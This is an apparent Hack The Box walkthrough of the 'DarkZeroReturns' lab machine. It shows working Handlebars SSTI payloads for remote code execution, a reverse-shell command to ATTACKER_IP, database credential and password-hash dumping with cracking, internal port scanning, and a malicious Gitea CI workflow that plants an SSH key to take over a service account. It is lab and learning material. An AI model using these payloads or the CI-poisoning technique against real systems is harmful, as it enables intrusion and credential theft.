# DarkZeroReturns Windows Hard HTB Machine Writeup

## NMAP Emuneration
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://dzcampaigns.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Web Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ whatweb http://dzcampaigns.htb/                                                                
http://dzcampaigns.htb/ [200 OK] Cookies[dz.sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[dz.sid], IP[10.129.17.163], Script, Title[DarkZero Campaigns], nginx[1.24.0]
```
In the `http://dzcampaigns.htb/character/new` saw this text:
```
A custom arrival message, if you wish. Default template: 
A new face emerges! The {{race}} {{class}} {{name}} has joined the campaign...
```
Which really suggest there is SSTI vulnerability, also when submit `{{7*7}}` something went wrong error occurs
## Web Exploiting
Confirmed the app use Handlebars with `{{#if true}}yes{{/if}}`
Use the [CVE-2026-33937](https://github.com/EQSTLab/CVE-2026-33937):
```
{
  "_csrf": "CHANGE_ME",
  "name": "jameskaois",
  "race": "jameskaois",
  "class": "jameskaois",
  "backstory": "jameskaois",
  "campaign_message": {
  "type": "Program",
  "body": [
    {
      "type": "MustacheStatement",
      "path": {
        "type": "PathExpression",
        "parts": ["log"]
      },
      "params": [
        {
          "type": "BooleanLiteral",
          "value": "{}, {hash: {}})) + process.mainModule.require('child_process').execSync('cat /etc/passwd') + Object(String(''"
        }
      ],
      "escaped": true,
      "loc": {
        "start": {},
        "end": {}
      } 
    }
  ]
}
}
```
On DevTools use the script:
```javascript
const csrf = document.querySelector('[name="_csrf"]').value;
const L = { start: { line: 1, column: 0 }, end: { line: 1, column: 1 } };

const ast = {
  type: "Program",
  body: [{
    type: "MustacheStatement",
    path: {
      type: "PathExpression", data: false, depth: 0,
      parts: ["lookup"], original: "lookup", loc: L
    },
    params: [
      { type: "PathExpression", data: false, depth: 0,
        parts: [], original: "this", loc: L },
      { type: "NumberLiteral",
        value: "{},{})) + process.mainModule.require('child_process').execSync('id').toString() //",
        original: 1, loc: L }
    ],
    escaped: true,
    strip: { open: false, close: false },
    loc: L
  }],
  strip: {},
  loc: L
};

const r = await fetch("/character/<character_id>", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    _csrf: csrf, name: "Testchar", race: "Elf", class: "Rogue",
    backstory: "test", campaign_message: ast
  })
});
console.log(r.status, await r.text());
```
> Remember to create a character with custom campaign message first, then use the script in `/character/<character_id>/edit` in order for the script to get the CSRF value.

Got web shell:
```javascript
const csrf = document.querySelector('[name="_csrf"]').value;
const L = { start: { line: 1, column: 0 }, end: { line: 1, column: 1 } };

const cmd = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1";
const b64 = btoa(cmd);
const payload = `{},{})) + process.mainModule.require('child_process').exec('echo ${b64} | base64 -d | bash') //`;

const ast = {
  type: "Program",
  body: [{
    type: "MustacheStatement",
    path: { type: "PathExpression", data: false, depth: 0,
            parts: ["lookup"], original: "lookup", loc: L },
    params: [
      { type: "PathExpression", data: false, depth: 0,
        parts: [], original: "this", loc: L },
      { type: "NumberLiteral", value: payload, original: 1, loc: L }
    ],
    escaped: true,
    strip: { open: false, close: false },
    loc: L
  }],
  strip: {},
  loc: L
};

const r = await fetch("/character/<character_id>", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    _csrf: csrf, name: "Testchar", race: "Elf", class: "Rogue",
    backstory: "test", campaign_message: ast
  })
});
console.log(r.status);
```
```bash
darkzero@SRV01:~$ id
uid=996(darkzero) gid=987(darkzero) groups=987(darkzero)
```
## Lateral Movement
```bash
darkzero@SRV01:~$ ls -la ../
total 24
drwxr-xr-x  6 root       root     4096 Jul 21 05:39 .
drwxr-xr-x 23 root       root     4096 Jul 20 13:13 ..
drwxrwxr-x  6 darkzero   darkzero 4096 Jul 14 06:10 DarkZero_Campaigns
drwxr-x---  4 svc-runner root     4096 May 20 23:36 gitea-runner
drwxr-xr-x  5 root       root     4096 Jul 21 05:38 sysinternalsEBPF
drwx------  2 root       root     4096 Jul 30 16:30 sysmon
darkzero@SRV01:~$ 

darkzero@SRV01:~$ ls -la
total 84
drwxrwxr-x   6 darkzero darkzero  4096 Jul 14 06:10 .
drwxr-xr-x   6 root     root      4096 Jul 21 05:39 ..
-rw-------   1 darkzero darkzero   133 May 20 10:11 .env
drwxrwxr-x 158 darkzero darkzero  4096 May 19 11:11 node_modules
drwxrwxr-x   4 darkzero darkzero  4096 May 19 10:55 .npm
-rw-rw-r--   1 darkzero darkzero   644 May 19 11:11 package.json
-rw-rw-r--   1 darkzero darkzero 43128 May 19 11:11 package-lock.json
drwxrwxr-x   2 darkzero darkzero  4096 May 19 08:53 scripts
-rw-rw-r--   1 darkzero darkzero  4638 May 19 11:11 server.js
drwxrwxr-x  12 darkzero darkzero  4096 Apr 24 14:45 src
darkzero@SRV01:~$ cat .env
PORT=8081
DB_HOST=localhost
DB_USER=darkzero
DB_PASSWORD=C4ntFindMyDMpass!
DB_NAME=darkzero_campaigns
SESSION_SECRET=DarkSession312#
darkzero@SRV01:~$ 
```
From the `.env` searching for any useful details in MySQL database:
```bash
mysql -u darkzero -p'C4ntFindMyDMpass!' -h localhost -D darkzero_campaigns

mysql> show tables
    -> ;
+------------------------------+
| Tables_in_darkzero_campaigns |
+------------------------------+
| campaign_messages            |
| campaigns                    |
| character_items              |
| characters                   |
| items                        |
| sessions                     |
| users                        |
+------------------------------+
7 rows in set (0.00 sec)

mysql> SELECT * FROM users;
+----+-----------------------+------------+--------------------------------------------------------------+--------+---------------------+
| id | email                 | username   | password_hash                                                | role   | created_at          |
+----+-----------------------+------------+--------------------------------------------------------------+--------+---------------------+
|  1 | admin@dzcampaigns.htb | admin      | $2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm | admin  | 2026-04-19 15:34:56 |
|  3 | josh@dzcampaigns.htb  | josh       | $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK | player | 2026-05-19 14:31:30 |
|  4 | jameskaois@gmail.com  | jameskaois | $2b$10$ONXZYqlmnvmuPOALnRAyKuEtJ5ZC0DznQZuMzG1PzpREiAyd6z/7y | player | 2026-07-30 16:32:25 |
+----+-----------------------+------------+--------------------------------------------------------------+--------+---------------------+
```
Found the `admin` and `josh` hashed password, lets crack it.
```bash
echo 'josh:$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK' > hash.txx
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 0.00% (ETA: 2026-07-30 10:22) 0g/s 157.1p/s 157.1c/s 157.1C/s caitlin..yamaha
Rangers1         (josh)
1g 0:00:02:52 DONE (2026-07-29 04:13) 0.005798g/s 156.7p/s 156.7c/s 156.7C/s babyboys..DAYANA
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Got the password of `josh`, from this we can ssh as `josh` to the target machine.
Didn't find the `user.txt` yet from `josh`:
```bash
josh@SRV01:~$ ls -la
total 32
drwx------ 5 josh         1000 4096 May 21 21:23 .
drwxr-xr-x 4 root root         4096 May 21 21:15 ..
lrwxrwxrwx 1 root root            9 May 21 21:23 .bash_history -> /dev/null
-rw-r--r-- 1 josh         1000  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 josh         1000 3968 Apr 19 14:54 .bashrc
drwx------ 2 josh         1000 4096 May 20 11:13 .cache
drwxrwxr-x 3 josh         1000 4096 May 20 11:13 .local
lrwxrwxrwx 1 josh root            9 May 19 14:36 .mysql_history -> /dev/null
-rw-r--r-- 1 josh         1000  807 Mar 31  2024 .profile
drwx------ 2 josh domain users 4096 Jul 14 06:13 .ssh
josh@SRV01:~$ find / -name user.txt 2>/dev/null
josh@SRV01:~$ 
```
```bash
josh@SRV01:~$ ip route
default via 172.16.20.1 dev eth0 onlink 
172.16.20.0/24 dev eth0 proto kernel scope link src 172.16.20.3 
josh@SRV01:~$ ss -tulnp
Netid            State             Recv-Q            Send-Q                        Local Address:Port                          Peer Address:Port            Process            
udp              UNCONN            0                 0                                127.0.0.54:53                                 0.0.0.0:*                                  
udp              UNCONN            0                 0                             127.0.0.53%lo:53                                 0.0.0.0:*                                  
tcp              LISTEN            0                 511                               127.0.0.1:8081                               0.0.0.0:*                                  
tcp              LISTEN            0                 4096                             127.0.0.54:53                                 0.0.0.0:*                                  
tcp              LISTEN            0                 4096                                0.0.0.0:22                                 0.0.0.0:*                                  
tcp              LISTEN            0                 151                               127.0.0.1:3306                               0.0.0.0:*                                  
tcp              LISTEN            0                 511                                 0.0.0.0:80                                 0.0.0.0:*                                  
tcp              LISTEN            0                 4096                          127.0.0.53%lo:53                                 0.0.0.0:*                                  
tcp              LISTEN            0                 70                                127.0.0.1:33060                              0.0.0.0:*                                  
tcp              LISTEN            0                 4096                                   [::]:22                                    [::]:*                                  
tcp              LISTEN            0                 4096                                      *:32887                                    *:*                                  
josh@SRV01:~$ 
```
The suspicious `32887`  port is listening, the port here just can be reached from internal network, since the Nmap scripts can't reach it maybe due to firewalls, and this port is really possible the `gitea-runner` owned by `swc-runner` that I saw earlier.
```bash
josh@SRV01:~$ ip route
default via 172.16.20.1 dev eth0 onlink 
172.16.20.0/24 dev eth0 proto kernel scope link src 172.16.20.3 
josh@SRV01:~$ for i in 1 2 3 4 5 10 20 100; do (ping -c1 -w1 172.16.20.$i >/dev/null 2>&1 && echo "172.16.20.$i UP") & done; wait
[1] 1806
[2] 1807
[3] 1810
[4] 1811
[5] 1814
172.16.20.3 UP
[6] 1815
172.16.20.1 UP
[7] 1817
[8] 1820
172.16.20.2 UP
[1]   Done                    ( ping -c1 -w1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[2]   Done                    ( ping -c1 -w1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[3]   Done                    ( ping -c1 -w1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[4]   Exit 1                  ( ping -c1 -w1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[5]   Exit 1                  ( ping -c1 -w1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
josh@SRV01:~$ 
```
Important:
```
172.16.20.1 UP
172.16.20.2 UP
172.16.20.3 UP
```
```bash
josh@SRV01:~$ cat /etc/resolv.conf
nameserver 172.16.20.2
search darkzero.ext
```
### What Active Directory is, and why joining matters
**Active Directory** is Microsoft's system for running an organisation's computers centrally. Rather than every machine keeping its own list of users and passwords, one server — a **domain controller** — holds the single authoritative list of every user, group, computer, and permission. When you log into your work laptop, the laptop doesn't check your password itself; it asks the domain controller. The collection of machines that trust that server is a **domain**, and this one is called `darkzero.ext`.
A machine that has been **joined** to the domain has, at setup time, established a permanent trust relationship with the domain controller. It received its own account in the directory, it accepts domain users as legitimate logins, and — critically — **it has the software installed to authenticate against the domain.**
### The map so far

| Address       | What it is                                 | How you know                       |
| ------------- | ------------------------------------------ | ---------------------------------- |
| `172.16.20.1` | The router out of this network             | `default via` in the routing table |
| `172.16.20.2` | **Almost certainly the domain controller** | It serves DNS for `darkzero.ext`   |
| `172.16.20.3` | SRV01 — you are here                       | `src 172.16.20.3` on `eth0`        |
### Emunerating the domain controller
```bash
josh@SRV01:~$ for p in 22 53 80 88 135 139 389 443 445 464 636 3000 3268 3389 5985 9389; do (timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2>/dev/null && echo "$p OPEN") & done 2>/dev/null; wait

88 OPEN
139 OPEN
135 OPEN
464 OPEN
636 OPEN
5985 OPEN
3000 OPEN
9389 OPEN
53 OPEN
389 OPEN
445 OPEN
3268 OPEN
[1]   Exit 124                ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[2]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[4]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[5]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[6]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[7]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[9]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[10]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[11]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[12]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[13]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[15]-  Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[16]+  Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[3]   Exit 124                ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[8]-  Exit 124                ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[14]+  Exit 124                ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
```

|Port|Service|Role|Simple Explanation|
|---|---|---|---|
|53|DNS|AD-integrated DNS for `darkzero.ext`|Resolves names for the domain|
|88|Kerberos|Ticket-granting service|Issues authentication tickets|
|135|RPC endpoint mapper|Locates RPC services|Directory for Windows remote procedure calls|
|139|NetBIOS session|Legacy SMB transport|Old-style file sharing|
|389|LDAP|Directory queries, cleartext|Read the directory of users and groups|
|445|SMB|File sharing and named pipes|Modern file sharing; also carries admin protocols|
|464|kpasswd|Kerberos password change|Change domain passwords|
|636|LDAPS|Directory queries over TLS|Encrypted directory access|
|**3000**|**Gitea**|**Self-hosted Git server**|**Source control, running on the DC**|
|3268|Global catalog|Forest-wide directory queries|Search across the whole forest, not just this domain|
|5985|WinRM|Remote PowerShell|Remote command execution|
|9389|AD Web Services|ADWS for PowerShell AD cmdlets|Programmatic directory management|
- **`172.16.20.2` is confirmed as a domain controller for `darkzero.ext`.** The combination of Kerberos (88, 464), LDAP (389, 636), global catalog (3268), SMB (445), RPC (135), and ADWS (9389) is definitive.
- **Gitea is listening on port 3000 of the domain controller itself.** The runner agent at `/opt/gitea-runner` on SRV01 connects to this instance. Co-locating a web application with a DC means any code execution against Gitea occurs on the machine holding the domain's directory database.
```bash
josh@SRV01:~$ curl http://172.16.20.2:3000/ | grep "gitea"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
<html lang="en-US" data-theme="gitea-auto">
100 13794    0 13794    <meta name="keywords" content="go,git,self-hosted,gitea">
  0     <meta property="og:url" content="http://gitea.darkzero.ext:3000/">
<link rel="stylesheet" href="/assets/css/theme-gitea-auto.css?v=1.25.0">
                appUrl: 'http:\/\/gitea.darkzero.ext:3000\/',
                customEmojis: {"codeberg":":codeberg:","git":":git:","gitea":":gitea:","github":":github:","gitlab":":gitlab:","gogs":":gogs:"},
                        <a class="item" target="_blank" rel="noopener noreferrer" href="https://docs.gitea.com">Help</a>
0                               Simply <a target="_blank" rel="noopener noreferrer" href="https://docs.gitea.com/installation/install-from-binary">run the binary</a> for your platform, ship it with <a target="_blank" rel="noopener noreferrer" href="https://github.com/go-gitea/gitea/tree/master/docker">Docker</a>, or get it <a target="_blank" rel="noopener noreferrer" href="https://docs.gitea.com/installation/install-from-package">packaged</a>.
                                Go get <a target="_blank" rel="noopener noreferrer" href="https://code.gitea.io/gitea">code.gitea.io/gitea</a>! Join us by <a target="_blank" rel="noopener noreferrer" href="https://github.com/go-gitea/gitea">contributing</a> to make this project even better. Don't be shy to be a contributor!
                        <a target="_blank" rel="noopener noreferrer" href="https://about.gitea.com">Powered by Gitea</a>
  965k      0 --:--:-- --:--:-- --:--:-- 1036k
```
Gitea running version  `1.25.0`
```
/assets/css/theme-gitea-auto.css?v=1.25.0"
```
```bash
josh@SRV01:~$ klist
Ticket cache: KEYRING:persistent:780601110:krb_ccache_OePOnli
Default principal: josh@DARKZERO.EXT

Valid starting       Expires              Service principal
07/30/2026 17:05:14  07/31/2026 03:05:14  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 08/06/2026 17:05:14
josh@SRV01:~$ which kinit klist kvno; ls -la /etc/krb5.conf
/usr/bin/kinit
/usr/bin/klist
/usr/bin/kvno
-rw-r--r-- 1 root root 693 Jul 30 16:30 /etc/krb5.conf
josh@SRV01:~$ getent hosts gitea.darkzero.ext
172.16.20.2     gitea.darkzero.ext
josh@SRV01:~$ kvno HTTP/gitea.darkzero.ext
HTTP/gitea.darkzero.ext@DARKZERO.EXT: kvno = 3
```
Found `/tmp/gitea_cookies.txt`, verify the authenticated:
```bash
curl -s --negotiate -u : -c /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1" \
  -o /dev/null -w "%{http_code}\n"
```
## Emunerating Gitea
```bash
josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/user" | python3 -m json.tool
{
    "id": 6,
    "login": "darkzero-ext_josh",
    "login_name": "",
    "source_id": 0,
    "full_name": "",
    "email": "ad8a459d-f75e-46b7-92b7-4213defd890d@localhost.localdomain",
    "avatar_url": "http://gitea.darkzero.ext:3000/avatars/5f3a440ab8b9ef02507361310493654d",
    "html_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh",
    "language": "en-US",
    "is_admin": false,
    "last_login": "1969-12-31T16:00:00-08:00",
    "created": "2026-05-20T13:44:57-07:00",
    "restricted": false,
    "active": true,
    "prohibit_login": false,
    "location": "",
    "website": "",
    "description": "",
    "visibility": "public",
    "followers_count": 0,
    "following_count": 0,
    "starred_repos_count": 0,
    "username": "darkzero-ext_josh"
}
```
Found an user named `darkzero-ext_josh`
```bash
josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/search?limit=50" \
  | python3 -c "import sys,json; [print(r['full_name'], '| private:', r['private']) for r in json.load(sys.stdin)['data']]"
DarkZero/DarkZero-Campaigns | private: True
```
Found an private repo, this is the web app which is vulnerable to Handlebars SSTI exploited earlier.
```bash
josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('perms:', d.get('permissions')); print('default_branch:', d.get('default_branch')); print('has_actions:', d.get('has_actions'))"
perms: {'admin': False, 'push': False, 'pull': True}
default_branch: main
has_actions: True
josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/contents/.gitea/workflows" \
  | python3 -m json.tool
[
    {
        "name": "main.yml",
        "path": ".gitea/workflows/main.yml",
        "sha": "2ce5d268ecd274e85d0379ce819956a59bab95b8",
        "last_commit_sha": "0d2c697eb31acef7ec81df70d33415cd0150b116",
        "last_committer_date": "2026-05-20T22:01:19+01:00",
        "last_author_date": "2026-05-20T22:01:19+01:00",
        "type": "file",
        "size": 295,
        "encoding": null,
        "content": null,
        "target": null,
        "url": "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/contents/.gitea/workflows/main.yml?ref=main",
        "html_url": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/src/branch/main/.gitea/workflows/main.yml",
        "git_url": "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/git/blobs/2ce5d268ecd274e85d0379ce819956a59bab95b8",
        "download_url": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/raw/branch/main/.gitea/workflows/main.yml",
        "submodule_git_url": null,
        "_links": {
            "self": "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/contents/.gitea/workflows/main.yml?ref=main",
            "git": "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/git/blobs/2ce5d268ecd274e85d0379ce819956a59bab95b8",
            "html": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/src/branch/main/.gitea/workflows/main.yml"
        }
    }
]
```
Found an `CI/CD` workflow, read what this workflow does:
```bash
josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/raw/branch/main/.gitea/workflows/main.yml"
# TODO : Add Tests & Deployment
name: CI
on: [push, pull_request]
jobs:
  ci:
    runs-on: ubuntu
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: npm }
      - run: npm ci
      - run: npm test
      - run: npm run build
```
This workflow is triggered when someone push or open a pull request, the exploit will be:
```
1. Fork the repo
2. Make changes that will gain shell as svc-runner
3. Make a pull request trigger the CI/CD task
```
## Get user flag
Fork the repo:
```bash
CSRF=$(grep _csrf /tmp/gitea_cookies.txt | awk '{print $7}')

curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -H "X-Csrf-Token: $CSRF" \
  -d '{}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('full_name:', d.get('full_name')); print('perms:', d.get('permissions')); print('message:', d.get('message',''))"
```
Prepare the key to overwrite `svc_runner` SSH key:
```bash
josh@SRV01:~$ ssh-keygen -t ed25519 -f /tmp/.runner_key -N '' -C 'ci'
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/.runner_key
Your public key has been saved in /tmp/.runner_key.pub
The key fingerprint is:
SHA256:bW7+R27T8Bq9L4Sbibk7nTfHwkMTaxnFq/d4uoFNAgI ci
The key's randomart image is:
+--[ED25519 256]--+
|      E        . |
|       .        o|
|        . .    ..|
|         o .  o. |
|        S o ..o= |
|         o  .*Xo |
|          o+.%=Bo|
|         o+ * &oO|
|          +=.++&o|
+----[SHA256]-----+
josh@SRV01:~$ cat /tmp.runn
cat: /tmp.runn: No such file or directory
josh@SRV01:~$ cat /tmp.runner_key
cat: /tmp.runner_key: No such file or directory
josh@SRV01:~$ cat /tmp/.runner_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFkdQnYGmehVGOVS1XA5Eb0Orcko7R10b5UHQI7ey3PJ ci
```
Prepare the malicious .yml:
```bash
cat > /tmp/foothold.yml << 'EOF'
name: foothold
on:
  pull_request_review_comment:
    types: [created]
jobs:
  foothold:
    runs-on: ubuntu
    steps:
      - run: |
          install -d -m 700 /home/svc-runner/.ssh
          echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFkdQnYGmehVGOVS1XA5Eb0Orcko7R10b5UHQI7ey3PJ ci' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          id
          cat /home/svc-runner/user.txt
EOF
```
Leveraging the CVE-2026-22555:
Upload the `foothold.yml` to the pull request commit:
```bash
B64=$(base64 -w0 /tmp/foothold.yml)

curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -d "{\"content\":\"$B64\",\"message\":\"ci\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea%2Fworkflows%2Ffoothold.yml" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('content',{}).get('name',''), d.get('message',''))"
```
Open pull request:
```bash
PR=$(curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -d '{"title":"CI","body":"update","head":"darkzero-ext_josh:main","base":"main"}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls")

PRNUM=$(echo "$PR" | python3 -c "import sys,json; print(json.load(sys.stdin)['number'])")
SHA=$(echo "$PR" | python3 -c "import sys,json; print(json.load(sys.stdin)['head']['sha'])")
echo "PR=$PRNUM SHA=$SHA"
```
Trigger the `pull_request_review_comment` event:
```bash
josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -d "{\"event\":\"COMMENT\",\"body\":\"go\",\"commit_id\":\"$SHA\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/$PRNUM/reviews" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('id:', d.get('id')); print('state:', d.get('state')); print('message:', d.get('message',''))"
id: 1
state: COMMENT
message: 
```
```bash
josh@SRV01:~$ ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3 'id; cat ~/user.txt'
Warning: Permanently added '172.16.20.3' (ED25519) to the list of known hosts.
uid=780601113(svc-runner) gid=780600513(domain users) groups=780600513(domain users),780601114(servicehandler)
9dabbb8e4a11afa3dabbd9f882eaf218
```
## Get root flag
Still in progress @@